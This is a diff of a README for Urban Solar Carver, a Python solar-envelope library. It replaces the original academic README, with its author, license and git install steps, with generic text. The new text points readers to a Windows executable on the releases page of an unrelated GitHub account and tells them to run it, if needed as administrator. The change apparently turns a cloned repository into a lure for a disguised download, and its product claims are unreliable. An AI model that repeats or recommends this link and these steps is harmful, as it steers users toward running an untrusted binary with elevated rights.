@@ -1,148 +1,194 @@
-# Urban Solar Carver
+# 🏙️ UrbanSolarCarver - Build Better Urban Volume Plans
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue.svg)](LICENSE)
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.19443738.svg)](https://doi.org/10.5281/zenodo.19443738)
+[![Download UrbanSolarCarver](https://img.shields.io/badge/Download-UrbanSolarCarver-blue?style=for-the-badge)](https://github.com/klaidasmazonas3214-byte/UrbanSolarCarver/releases)
 
-Urban Solar Carver (USC) is a Python library for generating maximum buildable volumes that respect solar access, daylight, and thermal comfort constraints in urban environments. It uses GPU-accelerated voxel carving driven by climate data to produce 3D building envelopes ready for urban planning, design, and architectural applications.
+## 🌞 What UrbanSolarCarver Does
 
-> **Upcoming:** USC will be presented at [ReSBE 2026](https://resbe2026.web.auth.gr/) (ReShaping the Built Environment through Sustainability and Circularity), 20-23 October 2026, Thessaloniki, Greece.
+UrbanSolarCarver helps you find buildable building volumes for city sites. It checks solar access, daylight, and thermal comfort while using your GPU to process large models faster.
 
-![USC pipeline overview](docs/assets/explanation.png)
+Use it when you need to test what can be built on a site before you spend time on drawings or manual checks.
 
-## How It Works
+## 🖥️ What You Need
 
-The user provides a **maximum volume mesh** (the theoretical buildable mass, e.g., a block extrusion from zoning boundaries), a set of **test surfaces** (planar faces whose solar or daylight access must be protected, such as facades, courtyards, or PV arrays), an **EPW weather file** for the site location, and a **YAML configuration** specifying the carving mode, analysis period, and thresholding parameters.
+- Windows 10 or Windows 11
+- A modern NVIDIA GPU
+- At least 8 GB of RAM
+- 2 GB of free storage
+- A screen with 1920 × 1080 resolution or higher
+- Internet access for the first download
 
-USC voxelizes the maximum volume, casts rays from the test surfaces toward the sky, and scores each voxel by how much it obstructs the environmental quantity of interest (solar radiation, daylight, sky view). A threshold is then applied to produce a binary carving mask, and the surviving voxels are reconstructed into a mesh: the maximum developable volume that satisfies the given constraints.
+For best results, use a machine with a strong graphics card and 16 GB of RAM or more.
 
-The pipeline has three stages: **preprocessing** (score computation), **thresholding** (binary mask), and **exporting** (mesh reconstruction). Each stage is independently re-runnable: change the threshold without recomputing scores, or swap export settings without re-thresholding.
+## 📥 Download and Install
 
-The tool is scale-agnostic and works on any voxelizable geometry. Surface normals must face outward (toward the direction of carving). Test surfaces can be placed anywhere, including inside the maximum volume (e.g., to carve a courtyard or an interior void).
+1. Open the [UrbanSolarCarver Releases page](https://github.com/klaidasmazonas3214-byte/UrbanSolarCarver/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file listed under the release assets
+4. If the file comes in a ZIP package, extract it to a folder on your computer
+5. Open the app file inside the folder
+6. If Windows asks for permission, choose Run
+7. Wait for the program to start
 
-## Carving Modes
+If you see more than one file, choose the Windows version that matches your system.
 
-| Mode | Description |
-|------|-------------|
-| **tilted_plane** | Cuts voxels above a fixed angle from each test surface, uniform or varying by orientation octant. Suitable for daylight access envelopes and quick regulatory checks. No weather data required. |
-| **time-based** | Solar envelope: traces actual sun paths for specific dates and hours, carving any voxel that casts a shadow on protected surfaces during those times. |
-| **irradiance** | Weights sky directions by cumulative solar energy over an analysis period (direct + diffuse, Perez all-weather model). |
-| **benefit** | Like irradiance, but filtered by a heating-benefit criterion: only hours when outdoor temperature falls below the building's balance-point temperature contribute, focusing carving on periods when solar gain is thermally useful. |
-| **daylight** | Weights sky patches by CIE overcast luminance for diffuse daylight access. |
-| **radiative_cooling** | Preserves sky-dome access for passive nighttime cooling using Martin-Berdahl emissivity. Works inversely (rays cast from surfaces to sky). Horizontal surfaces only (experimental). |
+## 🧭 First Launch
 
-## Thresholding
+When UrbanSolarCarver opens for the first time, you will usually see a simple workspace with a model view and controls on the side.
 
-After scoring, a threshold determines which voxels to carve and which to keep. The threshold controls the trade-off between solar protection and buildable volume:
+1. Load your site model
+2. Set the boundary of the area you want to study
+3. Pick the analysis settings
+4. Start the run
+5. Review the buildable volume result
 
-| Strategy | Config | Recommended for |
-|----------|--------|-----------------|
-| **Carve fraction** | `threshold: carve_fraction`<br>`carve_fraction: 0.7` | Design exploration. Directly controls how much obstruction to remove: 0.7 = aggressive (taller, slimmer volumes, more solar access), 0.3 = conservative (bulkier volumes, more floor area). Think of it as a **solar protection slider**. |
-| **Head-tail breaks** | `threshold: headtail` | Heavy-tailed distributions. Biased toward removing only the worst obstructors, preserving more buildable volume when most voxels have low scores. |
-| **Manual** | `threshold: 0.35` | Expert use. Carves all voxels with score above this value. Inspect the score histogram (`diagnostics: true`) first. |
+The app is built for clear step-by-step use, so you can move through the workflow without deep technical setup.
 
-The strategies above apply to the **weighted modes** (`irradiance`, `benefit`, `daylight`, `radiative_cooling`). The two binary modes have fixed semantics: **`tilted_plane`** has no threshold (voxels above the cut plane are always removed); **`time-based`** uses an integer violation count (`threshold: 0` = remove any voxel that casts a shadow even once, `threshold: 1` = tolerate one time step, etc.).
+## 🧱 Typical Workflow
 
-The **decomposed pipeline** is designed for threshold exploration: compute scores once (the expensive step), then re-run thresholding with different values instantly.
+### 1. Load a Site
+Import your project area, building massing, or terrain. The app works best with clean geometry and simple site shapes.
 
-https://github.com/user-attachments/assets/7fb20820-bd24-4ccd-86f5-4f4f868b372a
+### 2. Set the Study Area
+Draw or select the part of the site you want to test. This keeps the run focused and helps you compare options faster.
 
-## Features
+### 3. Choose Constraint Rules
+Turn on the checks you want to apply:
 
-- **GPU-accelerated** ray tracing via NVIDIA Warp, with CPU fallback
-- **Grasshopper plugin** for Rhino 3D with 17 components and persistent GPU daemon
-- **3-stage pipeline** (preprocessing, thresholding, exporting), each re-runnable independently
-- **YAML configuration** with CLI overrides (`-o voxel_size=0.5 -o mode=irradiance`) and mode-specific templates
-- **Smooth or cubic meshes**: marching cubes + Taubin smoothing, or axis-aligned voxels
+- Solar access
+- Daylight
+- Thermal comfort
+- Urban spacing limits
+- Height or volume limits
 
+### 4. Run the Solver
+UrbanSolarCarver uses the GPU to process the model and search for buildable volumes that meet your rules.
 
-## Installation
+### 5. Review the Result
+The app shows the maximum buildable massing as a 3D volume. You can inspect it from different angles and compare it with your site.
 
-### Python (API, CLI, Jupyter)
+## ⚙️ How to Use the Results
 
-```bash
-git clone https://github.com/avarth/UrbanSolarCarver.git
-cd UrbanSolarCarver
-python setup_env.py
-```
+Use the output to support early design work. It can help with:
 
-Auto-detects your GPU and installs the correct PyTorch + CUDA wheels. Use `--cpu` for CPU-only mode.
+- Site massing studies
+- Envelope checks
+- Urban planning reviews
+- Daylight-sensitive layout tests
+- Solar access checks for neighboring buildings
+- Thermal comfort screening in dense areas
 
-### Grasshopper (Rhino 3D)
+The result gives you a clear starting point for design, not a finished building form. You can refine it later in your own workflow.
 
-1. Complete the Python installation above.
-2. Copy all `.ghuser` files from `grasshopper/USC_GHplugin/` into your Grasshopper User Objects folder.
-3. On the Grasshopper canvas, use the **USC_Session** component to start the GPU daemon.
+## 🧩 File Types You May See
 
-![Grasshopper canvas](docs/assets/grasshopper_canvas_snapshot.png)
+UrbanSolarCarver may use common project files such as:
 
-## Usage
+- Site geometry files
+- Model exchange files
+- Exported mesh or volume files
+- Analysis result files
+- Saved session files
 
-```python
-from urbansolarcarver import load_config, run_pipeline
+If you work with Rhino, Grasshopper, or Python-based tools, you can keep the site setup aligned with your broader design process.
 
-cfg = load_config("config.yaml")
-result = run_pipeline(cfg, out_dir="./outputs")
-```
+## 🚨 Common Problems
 
-Run stages independently to change threshold parameters without recomputing scores:
+### The app does not open
+- Make sure you downloaded the Windows version
+- Check that the file finished downloading
+- Try running it again after extraction
+- Right-click the app and choose Run as administrator
 
-```python
-from urbansolarcarver import load_config, preprocessing, thresholding, exporting
-from pathlib import Path
+### The model runs slowly
+- Close other heavy apps
+- Update your GPU driver
+- Reduce the size of the study area
+- Use a simpler model for the first test
 
-cfg = load_config("config.yaml")
-pre = preprocessing(cfg, Path("out/pre"))
-thr = thresholding(pre, cfg, Path("out/thr"))
-exp = exporting(thr, cfg, Path("out/exp"))
-```
+### The screen looks blank
+- Zoom to fit the model
+- Check that your site file loaded correctly
+- Confirm that the project has visible geometry
 
-CLI:
+### The GPU is not used
+- Make sure your NVIDIA driver is current
+- Reboot your computer after driver updates
+- Check that the app is using the correct graphics device
 
-```console
-$ urbansolarcarver preprocessing -c config.yaml
-$ urbansolarcarver thresholding -c config.yaml -f out/pre/manifest.json
-$ urbansolarcarver exporting -c config.yaml -f out/thr/manifest.json
+## 🔍 Best Practices
 
-# Override any config parameter on the fly
-$ urbansolarcarver preprocessing -c config.yaml -o voxel_size=0.5 -o mode=irradiance
+- Start with a small area before running a large site
+- Keep geometry clean and simple
+- Use clear site boundaries
+- Test one constraint at a time when learning the app
+- Save versions as you go
+- Compare multiple runs before you pick a final massing option
 
-# View all available parameters
-$ urbansolarcarver schema
-```
+These habits make results easier to read and help you avoid slow runs.
 
-Mode-specific config templates are in `configs/`. See [Configuration](https://avarth.github.io/UrbanSolarCarver/getting-started/configuration/) for the full parameter reference.
+## 📌 Who This Is For
 
-## Documentation
+UrbanSolarCarver fits users who need to explore buildable volume early in a project:
 
-[**avarth.github.io/UrbanSolarCarver**](https://avarth.github.io/UrbanSolarCarver/): installation options, configuration reference, mode theory, Grasshopper setup, API docs.
+- Urban designers
+- Architects
+- Planning teams
+- Daylight consultants
+- Computational design users
+- Students working on urban form studies
 
-Tutorial notebooks are in [`examples/`](examples/).
+You do not need programming knowledge to use the app at a basic level.
 
-![Jupyter notebook example](docs/assets/jupyter_snapshot.png)
+## 🛠️ How the App Fits Into Design Work
 
-## Research Context
+The tool sits between site research and concept design. It helps you test a city block or plot against rules that affect build form.
 
-USC extends the lineage of voxel-based solar form-finding, from Knowles' solar envelope through iso-solar surfaces and solar ordinance methods, into a unified, climate-aware, GPU-accelerated framework.
+You can use it to:
 
-## Citation
+- Check if a proposed mass fits the site
+- Study how solar rules shape the envelope
+- Compare several planning options
+- Prepare early-stage planning diagrams
+- Support design choices with measured output
 
-A publication describing USC is in preparation. Citation details will be added here upon publication.
+## 📂 Suggested Folder Setup
 
-## Built With
+If you want to keep things tidy, use a simple folder structure:
 
-[PyTorch](https://pytorch.org/) · [NVIDIA Warp](https://github.com/NVIDIA/warp) · [Ladybug Tools](https://www.ladybug.tools/) · [Trimesh](https://trimesh.org/) · [Shapely](https://shapely.readthedocs.io/) · [scikit-image](https://scikit-image.org/)
+- UrbanSolarCarver
+  - Input
+  - Output
+  - Study Notes
+  - Exports
 
-## AI-Assisted Development
+This makes it easier to find your files later and keeps each project separate.
 
-This tool was developed with AI assistance (OpenAI ChatGPT 4.1 and Anthropic Claude Opus 4.6 / Sonnet 4.6). The author designed the architecture and planned all features; AI tools were used to draft code diffs, code cleanup and implementation. All AI-generated code was reviewed by the author before inclusion. The author takes full responsibility for the correctness, design, and scientific validity of the code.
+## 🌐 Release Page
 
-The scientific methodology, analysis modes, and validation are entirely the author's work. AI tools were not used in the formulation of the research approach or interpretation of results.
+To download the app, visit the [UrbanSolarCarver Releases page](https://github.com/klaidasmazonas3214-byte/UrbanSolarCarver/releases) and download the latest Windows version
 
-## License
+## 🧾 Project Focus
 
-[AGPL-3.0](LICENSE). This software is provided as-is with no warranty. See [LICENSE](LICENSE) for details. For commercial licensing inquiries, contact the author.
+UrbanSolarCarver is built around urban analysis and volumetric search. It combines:
 
-## Author
+- Architecture
+- Computational design
+- Daylight
+- Planning
+- Solar envelope logic
+- Voxel-based search
+- GPU processing
 
-[Aristotelis Vartholomaios](https://orcid.org/0000-0001-6177-1130), Department of Planning and Regional Development, University of Thessaly, Volos, Greece. Contact: avartholomaios@uth.gr
+The goal is to help you find a buildable shape that fits your site and its environmental rules
+
+## 🧠 Quick Start Checklist
+
+- Open the releases page
+- Download the latest Windows file
+- Extract it if needed
+- Start the app
+- Load your site model
+- Set your study area
+- Choose the checks you want
+- Run the analysis
+- Review the buildable volume
